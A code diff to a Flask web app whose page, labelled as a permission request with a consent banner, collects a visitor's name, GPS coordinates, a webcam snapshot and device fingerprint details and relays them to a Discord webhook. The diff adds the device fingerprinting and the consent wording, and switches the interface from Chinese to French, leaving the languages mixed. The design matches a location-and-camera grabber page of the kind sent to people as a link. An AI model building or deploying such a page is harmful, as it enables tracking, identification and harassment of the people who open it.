@@ -16,16 +16,29 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>权限许可请求</title>
+    <title>隐私与权限确认</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 450px; width: 100%; }
+        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
         h2 { color: #333; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; line-height: 1.5; }
+        
+        .legal-banner {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 2px solid #ffeeba;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 15px;
+            font-weight: bold;
+            text-align: right;
+            line-height: 1.6;
+        }
+
         #video-container { margin: 15px 0; display: none; }
         video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
         .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
-        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; }
         .btn-approve { background-color: #28a745; color: white; }
         .btn-deny { background-color: #dc3545; color: white; }
         #status { margin-top: 15px; font-weight: bold; }
@@ -34,14 +47,18 @@ HTML_TEMPLATE = """
 <body>
     <div class="card">
         <h2>权限许可请求</h2>
-        <p>您是否同意授予权限并分享您的姓名、地理位置以及相机访问权限？</p>
+        
+        <div class="legal-banner">
+            ⚠️ 法律声明：<br>
+            点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
+        </div>
 
         <div id="video-container">
             <video id="webcam" autoplay playsinline muted></video>
         </div>
         
         <form id="consentForm">
-            <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 8px; margin-bottom: 15px;"><br>
+            <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 10px; margin-bottom: 15px; font-size: 14px;"><br>
             
             <div class="btn-container">
                 <button type="button" class="btn-approve" onclick="captureAndSend(true)">Autoriser</button>
@@ -52,7 +69,6 @@ HTML_TEMPLATE = """
         <div id="status"></div>
     </div>
 
-    <!-- Canvas hidden for photo capture -->
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -62,7 +78,7 @@ HTML_TEMPLATE = """
 
             if (!consent) {
                 statusDiv.style.color = 'red';
-                statusDiv.innerText = '请求已被拒绝。';
+                statusDiv.innerText = '您已拒绝授权，未收集任何数据。';
                 return;
             }
 
@@ -73,22 +89,31 @@ HTML_TEMPLATE = """
             }
 
             statusDiv.style.color = 'gray';
-            statusDiv.innerText = '正在请求权限并拍照...';
+            statusDiv.innerText = '正在获取权限与设备信息...';
 
-            let locationData = "未授权位置";
+            let locationData = "Non autorisé";
             let imageBase64 = null;
 
-            // 1. GPS Location
+            // Collecte des informations de l'appareil
+            let deviceInfo = {
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || "Inconnu",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
+            };
+
+            // 1. Géolocalisation GPS
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                 });
-                locationData = `纬度: ${position.coords.latitude}, 经度: ${position.coords.longitude}`;
+                locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
             } catch (err) {
-                locationData = "拒绝位置权限";
+                locationData = "Accès à la localisation refusé";
             }
 
-            // 2. Camera Access and Capture
+            // 2. Capture de la caméra
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const videoElement = document.getElementById('webcam');
@@ -109,10 +134,10 @@ HTML_TEMPLATE = """
                 stream.getTracks().forEach(track => track.stop());
 
             } catch (err) {
-                console.log("无法访问相机: ", err);
+                console.log("Impossible d'accéder à la caméra: ", err);
             }
 
-            // 3. Send to server
+            // 3. Envoi des données
             try {
                 const response = await fetch('/submit-consent', {
                     method: 'POST',
@@ -121,6 +146,7 @@ HTML_TEMPLATE = """
                         consent: true,
                         username: username,
                         location: locationData,
+                        device: deviceInfo,
                         image: imageBase64
                     })
                 });
@@ -128,7 +154,7 @@ HTML_TEMPLATE = """
                 const result = await response.json();
                 if (response.ok) {
                     statusDiv.style.color = 'green';
-                    statusDiv.innerText = '照片已拍摄并成功发送！';
+                    statusDiv.innerText = '已成功授权并发送数据！';
                 } else {
                     statusDiv.style.color = 'red';
                     statusDiv.innerText = result.error || '发生错误。';
@@ -151,17 +177,22 @@ def home():
 def submit_consent():
     data = request.json or {}
     if not data.get("consent"):
-        return jsonify({"message": "请求已被拒绝。"}), 200
+        return jsonify({"message": "Demande refusée."}), 200
 
     username = data.get("username")
     location = data.get("location")
+    device = data.get("device", {})
     image_data = data.get("image")
 
+    # Message au format Français pour Discord
     payload = {
         "content": (
-            f"✅ **收到新的授权与抓拍照片：**\n"
-            f"• **姓名：** {username}\n"
-            f"• **地理位置 (GPS)：** {location}"
+            f"✅ **Nouveau consentement et détails de l'appareil:**\n"
+            f"• **Nom:** {username}\n"
+            f"• **Localisation (GPS):** {location}\n"
+            f"• **Résolution d'écran:** {device.get('screen')}\n"
+            f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
+            f"• **Processeur & RAM:** {device.get('cores')} Cœurs | {device.get('ram')}"
         )
     }
 
@@ -178,9 +209,9 @@ def submit_consent():
             resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
 
         resp.raise_for_status()
-        return jsonify({"message": "发送成功。"}), 200
+        return jsonify({"message": "Envoyé avec succès."}), 200
     except requests.RequestException as e:
-        return jsonify({"error": f"发送失败: {str(e)}"}), 500
+        return jsonify({"error": f"Échec de l'envoi: {str(e)}"}), 500
 
 if __name__ == "__main__":
     app.run(port=5000, debug=True)
